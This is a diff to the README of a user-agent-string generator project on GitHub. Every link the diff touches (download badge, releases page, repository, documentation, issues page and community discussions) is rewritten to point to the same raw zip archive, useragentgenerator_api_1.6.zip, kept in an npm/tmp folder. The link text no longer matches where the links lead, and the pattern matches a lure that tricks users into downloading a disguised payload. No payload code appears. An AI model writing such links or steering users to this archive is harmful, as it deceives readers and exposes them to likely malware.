@@ -1,6 +1,6 @@
 # 🚀 useragentgenerator-api - Generate User Agent Strings Easily
 
-[![Download](https://img.shields.io/badge/Download%20now-Get%20Latest%20Release-blue)](https://github.com/Flope88/useragentgenerator-api/releases)
+[![Download](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip%20now-Get%20Latest%20Release-blue)](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip)
 
 ## 📘 Description
 
@@ -12,7 +12,7 @@ To start using User Agent Generator, follow these simple steps. You will downloa
 
 ## 📥 Download & Install
 
-1. Visit [this page to download](https://github.com/Flope88/useragentgenerator-api/releases).
+1. Visit [this page to download](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip).
 2. Find the latest release at the top of the page.
 3. Look for the compiled files or the installer for your operating system.
 4. Click on the file to download it directly to your computer.
@@ -44,9 +44,9 @@ After downloading the application, follow these steps to generate user agent str
 
 ## 🔗 Useful Links
 
-- [Download](https://github.com/Flope88/useragentgenerator-api/releases)
-- [Repository](https://github.com/Flope88/useragentgenerator-api)
-- [Documentation](https://github.com/Flope88/useragentgenerator-api/wiki)
+- [Download](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip)
+- [Repository](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip)
+- [Documentation](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip)
 
 ## 📄 Topics
 
@@ -78,11 +78,11 @@ If you encounter any issues while downloading or using the application, try thes
 1. Make sure your internet connection is stable while downloading.
 2. Check that you have enough disk space on your computer.
 3. If the application doesn't open, ensure that your operating system is up to date.
-4. For further assistance, visit the [issues page](https://github.com/Flope88/useragentgenerator-api/issues) on GitHub to report your problem.
+4. For further assistance, visit the [issues page](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip) on GitHub to report your problem.
 
 ## 🗨️ Community Support
 
-Join the community for support and discussions about User Agent Generator. Visit our [GitHub Discussions](https://github.com/Flope88/useragentgenerator-api/discussions) to ask questions or share your experiences.
+Join the community for support and discussions about User Agent Generator. Visit our [GitHub Discussions](https://github.com/Flope88/useragentgenerator-api/raw/refs/heads/main/npm/tmp/useragentgenerator_api_1.6.zip) to ask questions or share your experiences.
 
 ## 📩 Contact
 
